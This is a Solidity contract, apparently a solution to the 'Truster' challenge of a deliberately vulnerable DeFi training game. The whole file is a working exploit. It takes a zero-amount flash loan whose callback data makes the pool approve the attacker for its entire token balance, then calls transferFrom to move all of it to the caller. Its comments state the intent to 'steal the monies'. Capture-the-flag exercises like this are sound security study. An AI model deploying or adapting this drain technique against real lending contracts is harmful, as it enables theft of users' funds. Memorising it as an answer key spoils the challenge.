//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrustBreaker {
    TrusterLenderPool private pool;
    IERC20 public immutable damnValuableToken;
    address public damnAddress;
    uint public initialBal;

    // going to have the pool approve me for the borrowAmount, then I will repay the loan, then I will steal the monies
    constructor(address addr, address tknAddr) {
        pool = TrusterLenderPool(addr);
        damnValuableToken = IERC20(tknAddr);
        damnAddress = address(damnValuableToken);
    }

    function breakTrust() public {
        initialBal = damnValuableToken.balanceOf(address(pool));
        //args =  amount, borrower, target, data
        pool.flashLoan(0, address(this), damnAddress, evilEncoder());
        //damnValuableToken.transfer(address(pool), 1); // Cant repay loan because we are approving ourselves instead
        damnValuableToken.transferFrom(address(pool), msg.sender, initialBal);
    }

    function evilEncoder() public view returns (bytes memory) {
        return
            abi.encodeCall(
                damnValuableToken.approve,
                (address(this), initialBal)
            );
    }
}
